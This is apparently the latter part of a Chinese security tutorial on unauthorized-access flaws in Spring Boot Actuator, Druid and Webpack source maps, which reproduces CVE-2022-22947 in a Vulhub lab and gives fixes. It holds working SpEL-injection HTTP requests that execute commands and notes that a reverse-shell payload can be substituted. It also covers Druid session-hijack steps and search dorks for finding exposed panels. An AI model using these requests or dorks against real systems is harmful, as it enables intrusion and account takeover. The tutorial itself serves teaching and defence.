以上工具检查的都是 Vulhub 靶场的 CVE-2022-22947 环境，最后顺便检测下 java-sec-code 靶场，可以发现该靶场环境在未登录的情况下 afrog 和 nuclei 均是扫描不出任何问题的，因为 java-sec-code 靶场本质上是不存在 Spingboot Actuator 未授权访问漏洞的，用户需要登录后才能访问到相应端点的路径，漏洞扫描工具自然也就扫描不出来漏洞：  
  
![imagepng](https://mmbiz.qpic.cn/sz_mmbiz_png/XvnzjMsl2ur61lKd3ZmhFhU5pMnxuKvjTS1LvxrUvthhnVpGM3Fq3PpkZCTN6hMobLNaoFTibazicThGfQ1IC2eA/640?wx_fmt=png "")  
  
  
![imagepng](https://mmbiz.qpic.cn/sz_mmbiz_png/XvnzjMsl2ur61lKd3ZmhFhU5pMnxuKvjZ78Wpia6VbfhBHvTs64wib90pOHOQJn25xCeUcQuyzxWKUCJn9H6rdibg/640?wx_fmt=png "")  
  
  
但是 nuclei 提供了 -H 参数，可以指定在所有 http 请求中包含的自定义 header、cookie，以header:value  
的格式指定（cli，文件），我们添加有效的 Cookie (通过抓取合法数据包提取）后对站点进行扫描，查看结果如下（通过-s high,critical  
参数过滤出高危、致命问题）：  
  
![imagepng](https://mmbiz.qpic.cn/sz_mmbiz_png/XvnzjMsl2ur61lKd3ZmhFhU5pMnxuKvjw0UZeicadvjHx6RSAuFbQTwCGuFxZwqteomyQEn0IvPZHM81zozOiaicg/640?wx_fmt=png "")  
  
## CVE-2022-22947 RCE  
  
Spring Cloud Gateway 是 Spring 中的一个 API 网关，旨在提供一种简单而有效的方法来路由到 API 并为其提供横切关注点，例如：安全性、监控/指标和弹性（英文直译，可参见官方介绍文档）。客户端发起请求给网关，网关处理映射找到一个匹配的路由，然后发送该给网关的 Web 处理器，处理器会通过一条特定的Filter链来处理请求，最后会发出代理请求，Filter 不仅仅做出预过滤，代理请求发出后也会进行过滤。  
  
Spring Cloud Gateway 在其 3.1.0 及 3.0.6 版本（包含）以前存在一处 SpEL 表达式注入漏洞，当 Gateway Actuator 端点启用、暴露且不安全时，使用 Spring Cloud Gateway 的应用程序很容易受到代码注入攻击。远程攻击者可能会发出恶意制作的请求，从而允许在远程主机上进行任意远程执行。  
  
受影响的 Spring Cloud Gateway 版本（当前官网版本已达 v4.0.9）：  
```
3.1.03.0.0 to 3.0.6  Older, unsupported versions are also affected
```  
  
漏洞披露与分析文章链接：https://wya.pl/2022/02/26/cve-2022-22947-spel-casting-and-evil-beans/。  
### 漏洞原理分析与复现  
  
从 Spring官方的修复代码 可以直观看出这个 SpEL 表达式注入的位置：  
  
![imagepng](https://mmbiz.qpic.cn/sz_mmbiz_png/XvnzjMsl2ur61lKd3ZmhFhU5pMnxuKvj3iaQPEClA4VicjIrAjnwLqoHpzdZC8YhtQc8scGb4UjnWzPJ5x4XkO7A/640?wx_fmt=png "")  
  
  
修复方法是使用安全的上下文 SimpleEvaluationContext 替换了不安全的 StandardEvaluationContext（SpEL 表达式注入漏洞的相关知识可以参见我的另一篇文章：《Java代码审计之SpEL表达式注入漏洞分析》）：  
  
![imagepng](https://mmbiz.qpic.cn/sz_mmbiz_png/XvnzjMsl2ur61lKd3ZmhFhU5pMnxuKvjfEoskgZyPiclIhOj0L16aOX4Z4wbALOXQPYK1Y8VjeLlYroNsb9h6kw/640?wx_fmt=png "")  
  
  
至于入参传递到漏洞触发点的过程请参见《Spring Cloud GateWay 远程代码执行漏洞(CVE-2022-22947) 》，此处不展开。  
  
直接使用 Vulhub 靶场环境和 指导文档 快速进行漏洞复现，前面已经提到了 Vulhub 靶场的 CVE-2022-22947 环境，存在 actuator 未授权访问且启用了 Actuator Gateway ：  
  
![imagepng](https://mmbiz.qpic.cn/sz_mmbiz_png/XvnzjMsl2ur61lKd3ZmhFhU5pMnxuKvjkGEEK8e47r99InibeTWdRl8vMuHdtV3O6j1hqiaBqFUJHrEFDI9TJiccA/640?wx_fmt=png "")  
  
  
![imagepng](https://mmbiz.qpic.cn/sz_mmbiz_png/XvnzjMsl2ur61lKd3ZmhFhU5pMnxuKvjkYiaFxFd0bKHtpA7U6urSSddqNTneAx9JBXicuaqLRmgfca4HUL8rb5g/640?wx_fmt=png "")  
  
  
从官方文档 https://docs.spring.io/spring-cloud-gateway/docs/3.0.4/reference/html/#actuator-api 可以看到，如果配置了暴露 actuator 端点，允许 jmx 或者 Web 访问，则可以通过 /gateway 接口与网关进行交互，并创建新的自定义路由。  
  
![imagepng](https://mmbiz.qpic.cn/sz_mmbiz_png/XvnzjMsl2ur61lKd3ZmhFhU5pMnxuKvjddElaxq5RcvU113Cns4FGLSeJJ72KlsI0wb7jsLuALEHLbXs9k9uDw/640?wx_fmt=png "")  
  
  
利用这个漏洞需要发送两个 HTTP 数据包。  
  
首先，发送如下数据包即可添加一个包含恶意 SpEL 表达式的路由：  
```
POST /actuator/gateway/routes/hacktest HTTP/1.1Host: localhost:8080Accept-Encoding: gzip, deflateAccept: */*Accept-Language: enUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36Connection: closeContent-Type: application/jsonContent-Length: 329{"id":"hacktest","filters":[{"name":"AddResponseHeader","args":{"name":"Result","value":"#{new String(T(org.springframework.util.StreamUtils).copyToByteArray(T(java.lang.Runtime).getRuntime().exec(new String[]{\"id\"}).getInputStream()))}"}}],"uri":"http://example.com"}
```  
  
![imagepng](https://mmbiz.qpic.cn/sz_mmbiz_png/XvnzjMsl2ur61lKd3ZmhFhU5pMnxuKvjQ3Q50oNmgGPgO1omksFSocjgUuKHk4ibOmHucKvCHOgak11DtbeicwHg/640?wx_fmt=png "")  
  
  
然后，发送如下数据包应用刚添加的路由，这个数据包将触发 SpEL 表达式的执行：  
```
POST /actuator/gateway/refresh HTTP/1.1Host: localhost:8080Accept-Encoding: gzip, deflateAccept: */*Accept-Language: enUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36Connection: closeContent-Type: application/jsonContent-Length: 329{"id":"hacktest","filters":[{"name":"AddResponseHeader","args":{"name":"Result","value":"#{new String(T(org.springframework.util.StreamUtils).copyToByteArray(T(java.lang.Runtime).getRuntime().exec(new String[]{\"id\"}).getInputStream()))}"}}],"uri":"http://example.com"}
```  
  
![imagepng](https://mmbiz.qpic.cn/sz_mmbiz_png/XvnzjMsl2ur61lKd3ZmhFhU5pMnxuKvjRBMEoviboxLiaIBHicA2yV1VO4YyvxK4Sx6W10p3f4nrgkt42hkZpZhLw/640?wx_fmt=png "")  
  
  
最后发送如下数据包即可查看执行结果：  
```
GET /actuator/gateway/routes/hacktest HTTP/1.1Host: localhost:8080Accept-Encoding: gzip, deflateAccept: */*Accept-Language: enUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36Connection: closeContent-Type: application/x-www-form-urlencodedContent-Length: 0
```  
  
![imagepng](https://mmbiz.qpic.cn/sz_mmbiz_png/XvnzjMsl2ur61lKd3ZmhFhU5pMnxuKvjHJt5AxzQKhbnkibVC31f4L96MTibjoHwY3zRD5JTjnx1JsFHLTEdwKhA/640?wx_fmt=png "")  
  
  
上面的演示只是为了简单起见，也可以将恶意路由的 SpEL 表达式替换为 basse64 的反弹 shell 命令。  
  
【漏洞修复方案】  
  
除了升级 Spring cloud Gateway 到最新版本以外，也可以禁用 actuator gateway。通过前面的漏洞利用过程可以看到，首先需要通过 /actuator/gateway/routes/{id}API  
 创建一条路由。因此将此 API 禁止，也可实现漏洞的修复。根据 Actuator 的 API 文档可知，启用 actuator gateway 需要设置以下两个配置的值：  
```
management.endpoint.gateway.enabled=true # default valuemanagement.endpoints.web.exposure.include=gateway
```  
  
因此只要这两个选项不同时满足，就不会启用 actuator gateway。  
### 漏洞自动化利用工具  
  
沿用前文提到的 SpringBoot 框架漏洞探测工具：https://github.com/0x727/SpringBootExploit：  
  
![imagepng](https://mmbiz.qpic.cn/sz_mmbiz_png/XvnzjMsl2ur61lKd3ZmhFhU5pMnxuKvjyGbesxZCvv6oIic7DxnlYibRu3FuDN2x0pLokCJ85BIP7tXhrrOOfZfA/640?wx_fmt=png "")  
  
  
![imagepng](https://mmbiz.qpic.cn/sz_mmbiz_png/XvnzjMsl2ur61lKd3ZmhFhU5pMnxuKvjOgLncZsfUmkJEicceneubPN90sTaz7EwdLicdTJ1EMzPPM3efibG5zt6Q/640?wx_fmt=png "")  
  
  
此漏洞扫描和利用也可以使用 Goby 社区版：https://github.com/gobysec/Goby，Goby是一款基于网络空间测绘技术的新一代网络安全工具，它通过给目标网络建立完整的资产知识库，进行网络安全事件应急与漏洞应急，官方文档：https://gobysec.net/faq。  
  
![imagepng](https://mmbiz.qpic.cn/sz_mmbiz_png/XvnzjMsl2ur61lKd3ZmhFhU5pMnxuKvjn292UYhpPyYTSYpsxo2UR3Fk8Jg1tRK5eXQYVbvbQ2jX3KA66QlBjg/640?wx_fmt=png "")  
  
  
![imagepng](https://mmbiz.qpic.cn/sz_mmbiz_png/XvnzjMsl2ur61lKd3ZmhFhU5pMnxuKvjILwVXkvEA3DQTmLlA4u11NazckdXFHOXLV0fgsZxx1h8z5rn6aibticw/640?wx_fmt=png "")  
  
  
点击扫描出来的 CVE-2022-22947 进去快速验证漏洞：  
  
![![imagepng](https://img-blog.csdnimg.cn/img_convert/fcb7974d2a35c909c716f61bbafcf209.png](https://mmbiz.qpic.cn/sz_mmbiz_png/XvnzjMsl2ur61lKd3ZmhFhU5pMnxuKvj7WL6l5qL1jW6BkWKTrOiaTqs5d555OrVyWLWPNxveURYmI11myLKeJQ/640?wx_fmt=png "")  
  
  
Goby 跟前面的 nuclei、afrog 的共同特点是基于内置的漏洞 poc 扫描模板库，且都支持使用者自定义新增的 poc 规则。  
  
![imagepng](https://mmbiz.qpic.cn/sz_mmbiz_png/XvnzjMsl2ur61lKd3ZmhFhU5pMnxuKvjeXTFyZ7McOBzbLemmRlc4fx85ruIQc6sdBBH3lK8hz7aOHRzOwBDnA/640?wx_fmt=png "")  
  
  
优势是 Goby 提供了较为丰富的图形化界面、支持漏洞快速验证功能，以及支持丰富的扩展插件。  
  
![imagepng](https://mmbiz.qpic.cn/sz_mmbiz_png/XvnzjMsl2ur61lKd3ZmhFhU5pMnxuKvjlmxhjicHFBPIEPxrDxuThaGIp0uDiaTnGpWKhWLgn9euaRIVeicCUdXog/640?wx_fmt=png "")  
  
  
缺点也很明显，专业版收费很贵：  
  
![imagepng](https://mmbiz.qpic.cn/sz_mmbiz_png/XvnzjMsl2ur61lKd3ZmhFhU5pMnxuKvjiar5Fq0ZJj9EwukxkkplJyH0SPKDZlgnb1BudicAIsEkH2GxVypePcyw/640?wx_fmt=png "")  
  
## 其他常见未授权访问  
  
网上总结的常见的渗透测试常见的未授权访问漏洞：《二十八种未授权访问漏洞合集》，下文仅挑部分展开描述。  
### Druid未授权访问漏洞  
  
Druid 是阿里巴巴数据库事业部出品，为监控而生的数据库连接池，官方项目地址：https://github.com/alibaba/druid。Druid 提供的监控功能，包括监控 SQL 的执行时间、监控 Web URI 的请求、以及 Session 监控等。  
  
当开发者配置不当时就可能造成未授权访问漏洞，即项目中引入 druid-spring-boot-starter，且 spring.datasource.druid.stat-view-servlet.enabled  
 配置为 true 时，可以直接访问 Druid Monitor 监控平台，可能会造成企业机密信息被攻击者获取。  
```
<dependency><groupId>com.alibaba</groupId><artifactId>druid-spring-boot-starter</artifactId><version>1.1.16</version></dependency>
```  
```
spring.datasource.druid.stat-view-servlet.enabled=true
```  
  
漏洞默认路径：  
```
http://www.xxxx.com/druid/index.html
```  
  
![imagepng](https://mmbiz.qpic.cn/sz_mmbiz_png/XvnzjMsl2ur61lKd3ZmhFhU5pMnxuKvjOkia7uPVPDRTL1ajntkib7VtKyqMjWUtGOlHZpF9w5ETkxTJofEMkWeg/640?wx_fmt=png "")  
  
  
Fofa 资产搜索语法：  
```
title="Druid Stat Index"
```  
  
Google 搜索语法：  
```
inurl:"druid/index.html" intitle:"Druid Stat Index"
```  
  
【漏洞利用】  
  
Druid 未授权访问在没有进一步利用的情况下仅仅是一个低风险的信息泄露漏洞，但是攻击者也可以进一步利用利用该漏洞来提高危害。  
  
首先可以借助未授权访问收集一下服务器的 API 接口相关信息：  
```
/druid/weburi.html
```  
  
![imagepng](https://mmbiz.qpic.cn/sz_mmbiz_png/XvnzjMsl2ur61lKd3ZmhFhU5pMnxuKvjkyjqlMRwjVLtYLlbcScbicJQibDU7dK2rlmmlrI46Z7PzJ3JlC73MV0Q/640?wx_fmt=png "")  
  
  
该接口泄露了网站功能模块的 API 接口，可以进一步探测这些 API 接口是否存在未授权访问、SQL 注入、XSS 等漏洞。  
  
与此同时，应当关注可能泄露用户 session 的路径：  
```
/druid/websession.html
```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/XvnzjMsl2ur61lKd3ZmhFhU5pMnxuKvj2fgvGoJTQmicUzX35kEcjzqfkGbS2y9evc502Dq4knicH6UDRE7VbWxg/640?wx_fmt=png "")  
  
  
此处泄露的主要是登录用户的 session，不管是登陆成功的、没登陆成功的，还是失效的都会储存在这里。  
> 【漏洞利用思路】当 /druid/websession.html  
 页面存在数据时，我们可利用该页面的 session 伪造用户身份访问 /druid/weburi.html  
 泄露的 API 接口路径，来进一步访问敏感业务接口，甚至登录系统后台。请注意应当点击最后访问时间，然后复制一条离现在时间最为接近的 session 进行伪造登录，尽量避免因 session 已失效而导致利用失败。  
  
  
拿到 session 后登录后台的方法可以参见《Kali Linux-BeEF浏览器渗透框架》中的 XSS 利用章节，网上成功借助 Druid 未授权访问窃取 session 并登录后台的案例：《Druid未授权访问实战利用》。  
  
【修复方案】  
  
方案一：直接禁止页面访问，SpringBoot 项目修改配置文件 application.properties（或者不配置，此配置默认为 false）。  
```
spring.datasource.druid.stat-view-servlet.enabled=false
```  
  
![imagepng](https://mmbiz.qpic.cn/sz_mmbiz_png/XvnzjMsl2ur61lKd3ZmhFhU5pMnxuKvj0atXboRc4mxuliaDpWdHDibbnkrqOyia1ffJmwonjMsgcGXxTmo8YkRicg/640?wx_fmt=png "")  
  
  
方案二：增加账号密码登录，账号密码可自定义配置，与数据库无关。  
```
spring.datasource.druid.stat-view-servlet.enabled=truespring.datasource.druid.stat-view-servlet.login-username=rootspring.datasource.druid.stat-view-servlet.login-password=123
```  
  
![imagepng](https://mmbiz.qpic.cn/sz_mmbiz_png/XvnzjMsl2ur61lKd3ZmhFhU5pMnxuKvjy97bBXxX8w1SSiaia7xwEaZnNNHwSjiajpcdWicCVzgQEVOf0nxp9t68icw/640?wx_fmt=png "")  
### Webpack 源代码泄露  
  
Webpack 是一个强大的前端资源模块打包工具，可以将多个 JS、CSS、JSON等 文件打包成一个或多个文件，使代码更加模块化，便于编程和使用。目前前端部署的代码一般都是经过 webpack 压缩的，压缩的目的一般如下：移除无用代码、混淆代码中变量名称、函数名称等，以及对结构进行扁平化处理。Vue 使用 webpack 静态资源打包器的时候，如果未进行正确配置，会产生一个 js.map 文件，而这个 js.map 可以通过工具来反编译还原 Vue 源代码，导致前端源代码泄露。  
  
**0x01 SourceMap 的作用**  
  
SourceMap 在其中扮演了一个十分重要的角色，用来作为源代码和编译代码之间的映射，方便开发定位问题。一般在压缩 js 的过程中，会生成相应的 sourcemap 文件，并且在压缩的 js 文件末尾追加 sourcemap 文件的链接 ，如：_//# sourceMappingURL=xxxx.js.map_  
。这样，浏览器在加载这个压缩过的js 时，就知道还有一个相应的 sourcemap 文件，也会一起加载下来，运行的过程中如果 js 报错，也会给出相应源代码的行号与列号，而非压缩文件的。总而言之，Sourcemap 初衷是方便开发排错，它不应该用在生产环境，如果用在生产环境，攻击者就可以通过 sourcemap 文件中的映射，还原出前端完整代码。  
  
**0x02 Webpack 源码泄露危害**  
  
Webpack 前端源码泄露漏洞可能导致以下危害：  
1. 敏感信息泄露：攻击者可以获取到前端源码，从而获取到敏感信息，如 API、管理员邮箱、内部功能等；  
  
1. 代码审计：攻击者可以对获取到的源码进行代码审计，查找潜在的安全漏洞和恶意代码。  
  
**0x03 Webpack 站点的识别**  
  
前端打包工具 Webpack 所生成的是一个纯 JS 的网站，即源码之中并无多余的 HTML 内容，所有的前端内容都依赖于浏览器对 JS 文件的解析，并且此类网站之中通常存在一行 noscript 提示告诉没有启用JS的访问者启用 JS 功能才能正常浏览网站。  
  
以雷神众测为例，它便是一个标准的 Webpack 站点（但是不存在前端源代码信息泄露）：  
  
![imagepng](https://mmbiz.qpic.cn/sz_mmbiz_png/XvnzjMsl2ur61lKd3ZmhFhU5pMnxuKvjNicbaUka3Y3O4h6yRwmO0YAy4CLapboYWEVQibS3NkwWzibFtPJ4KDefw/640?wx_fmt=png "")  
  
  
![imagepng](https://mmbiz.qpic.cn/sz_mmbiz_png/XvnzjMsl2ur61lKd3ZmhFhU5pMnxuKvjWqjQZy7MonmgYT4oH8JjZLXTGpNWAxt50N9CcBUa1fe0ibqmtRpiaJXg/640?wx_fmt=png "")  
  
  
![imagepng](https://mmbiz.qpic.cn/sz_mmbiz_png/XvnzjMsl2ur61lKd3ZmhFhU5pMnxuKvjWB16VVWFlh0LlGMHKGqxKx4Tn1cTvFLJs0ahl6S6W96Nk4zjx8khwA/640?wx_fmt=png "")  
  
  
而在 webpack 项目源码泄漏的情况下，则可以在浏览器控制台中的 Sources->Page->webpack://  
 中查看到前端源代码：  
  
![imagepng](https://mmbiz.qpic.cn/sz_mmbiz_png/XvnzjMsl2ur61lKd3ZmhFhU5pMnxuKvj0JzsniafViackiaE5Z9xyU31sLUPkicRVwZhAT0plVMmHodAptsr96xsSg/640?wx_fmt=png "")  
  
**0x04 Webpack 源码泄露利用**  
  
举个例子：  
  
![imagepng](https://mmbiz.qpic.cn/sz_mmbiz_png/XvnzjMsl2ur61lKd3ZmhFhU5pMnxuKvj17bOics9wia7cShOpibtdGXEy4IpUhyegk2oPXLoriac8ACnAxn5BAuVCw/640?wx_fmt=png "")  
  
  
直接查看网站的 js 文件，可以在末尾处看到均有 js.map 文件名：  
  
![imagepng](https://mmbiz.qpic.cn/sz_mmbiz_png/XvnzjMsl2ur61lKd3ZmhFhU5pMnxuKvjsltSaKq4qGC6U2bFTiaFQzArauO6NAEqgmQlXmia29e5X8vNSOf5rCvQ/640?wx_fmt=png "")  
  
  
手动下载 js.map 文件：  
  
![imagepng](https://mmbiz.qpic.cn/sz_mmbiz_png/XvnzjMsl2ur61lKd3ZmhFhU5pMnxuKvjOpVSUzEwfkThweTpfucUdEspibpgQCkOibzRTTibExA9ByYIdrnePPvYA/640?wx_fmt=png "")  
  
  
安装 npm（Windows 下载并安装 https://nodejs.org/en/download 即可），使用 npm 安装 reverse-sourcemap：  
```
npminstall--global reverse-sourcemap# 检查是否安装成功reverse-sourcemap -h
```  
  
![imagepng](https://mmbiz.qpic.cn/sz_mmbiz_png/XvnzjMsl2ur61lKd3ZmhFhU5pMnxuKvjP7rib7REQLZGrfa4STPicNHO57Ykd6WpB97LicGbEZLNYpXpTugYWuBpg/640?wx_fmt=png "")  
  
  
![imagepng](https://mmbiz.qpic.cn/sz_mmbiz_png/XvnzjMsl2ur61lKd3ZmhFhU5pMnxuKvjhoRWyZ4FGRbs7LGctqPGeNlbxqPyRzujyXBawgya7NZ1VKxfjnxcUw/640?wx_fmt=png "")  
  
  
接下来即可使用 reverse-sourcemap 进行 js.map 文件还原操作：  
```
reverse-sourcemap --output-dir ./  app-3f69d31c7deabb2b760a.js.map
```  
  
![imagepng](https://mmbiz.qpic.cn/sz_mmbiz_png/XvnzjMsl2ur61lKd3ZmhFhU5pMnxuKvjDguiaDmhXMOZf9b44hbja0AXicvxic8XY2cmsAnGFsEoRicIsM78elsPicw/640?wx_fmt=png "")  
  
  
随后拖入 VSCode 查看源代码即可：  
  
![imagepng](https://mmbiz.qpic.cn/sz_mmbiz_png/XvnzjMsl2ur61lKd3ZmhFhU5pMnxuKvjXNdDrOvNJiauTrCFiblkfQgVuoibduicjNIlUx8ghicEwoASxgxYciaJ8kng/640?wx_fmt=png "")  
  
**0x05 Webpack 自动探测工具**  
  
【**检测工具 1：HaE**  
】  
  
BurpSuite 开源插件 HaE （https://github.com/gh0stkey/HaE）支持检测 SourceMap 文件：  
  
![imagepng](https://mmbiz.qpic.cn/sz_mmbiz_png/XvnzjMsl2ur61lKd3ZmhFhU5pMnxuKvjq0PHpAqPxicOb3gneib20vKo9c2pcZByP2XXYJHYiad1ULSNGxvU9bBMQ/640?wx_fmt=png "")  
  
  
  
HaE 是一个基于 BurpSuite Java 插件 API 开发的辅助型框架式插件，旨在实现对 HTTP 消息的高亮标记和信息提取。该插件通过自定义正则表达式匹配响应报文或请求报文，并对匹配成功的报文进行标记和提取。  
  
  
【检测工具 2：Packer Fuzzer】  
  
  
Packer Fuzzer 工具：https://github.com/rtcatc/Packer-Fuzzer。Packer Fuzzer 工具目前支持自动化提取 JS 资源文件并利用现成规则和暴力提取模式提取其中的 API 及对应参数，在提取完成之后支持对：未授权访问、敏感信息泄露、CORS、SQL 注入、水平越权、弱口令、任意文件上传七大漏洞进行模糊高效的快速检测。在扫描结束之后，本工具还支持自动生成扫描报告，您可以选择便于分析的HTML版本以及较为正规的 doc、pdf、txt 版本。  
> 但注意此漏洞利用工具请注意需要单独执行 pip install python-docx==0.8.11 -i https://pypi.tuna.tsinghua.edu.cn/simple 后才能正常运行。  
  
  
执行扫描并查看结果：  
```
# SSL连接安全选项，当为空时默认关闭状态，在此状态下将会阻止一切不安全的连接。# 若您希望忽略SSL安全状态，您可使用1命令开启，将会忽略一切证书错误，例如：-f 1python PackerFuzzer.py -u https://XXX.XXX.XXX.234/ -f1
```  
  
![imagepng](https://mmbiz.qpic.cn/sz_mmbiz_png/XvnzjMsl2ur61lKd3ZmhFhU5pMnxuKvjyVub9ibRSV69ibiafQbliaqA7AQT3P4IHZhJhuSt3m1niaNq3AU8Iia0HpUg/640?wx_fmt=png "")  
  
  
![imagepng](https://mmbiz.qpic.cn/sz_mmbiz_png/XvnzjMsl2ur61lKd3ZmhFhU5pMnxuKvjL5FbdnwJJcGU5OMRdGxlvqxd3IiaclWfOGPKzjwPDr15vL5SEPRtT0w/640?wx_fmt=png "")  
  
  
![imagepng](https://mmbiz.qpic.cn/sz_mmbiz_png/XvnzjMsl2ur61lKd3ZmhFhU5pMnxuKvjau2NibiaYB3s2r275SOyIER1pZ13hxctYLYleBzEfMeYcOiciaAsIQkEJg/640?wx_fmt=png "")  
  
  
![imagepng](https://mmbiz.qpic.cn/sz_mmbiz_png/XvnzjMsl2ur61lKd3ZmhFhU5pMnxuKvjmoZIqLXHef43efvASBl50ZrYOJkvFFL0Dv5GDUMotbGXnCH4Ouo1fQ/640?wx_fmt=png "")  
  
0x06 Webpack 源码泄露防御  
  
  
如何防范 Webpack 前端源码泄露漏洞？  
  
  
在 Webpack 的配置文件（config/index.js）中，配置 productionSourceMap:false，即可关闭 .map 文件的生成，这样可以有效防止源码泄露；  
  
  
压缩和混淆代码：Webpack 提供了 UglifyJsPlugin 插件和 TerserPlugin 插件来压缩和混淆代码，可以有效地提高代码的安全性，使用这些插件可以将代码压缩、混淆，使攻击者难以阅读和修改；  
  
****  
总结  
  
  
本文总结学习了 Swagger-UI、SpringBoot Actuator、Druid、Webpack 组件的未授权访问漏洞基本原理与漏洞探测方法，在介绍了几款自动化扫描工具的同时，也简要分析了 CVE-2022-22947 Spring Cloud Gateway 系统 RCE 漏洞  
  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/XvnzjMsl2uoV0T07PpoeuvEpuTic7cNVdOaM13UNk0JtCQSoegjVkMPCw0opM2apDp3mxPUiapRc6hOdPcPavlfg/640?wx_fmt=png "")  
  
  
。  
  
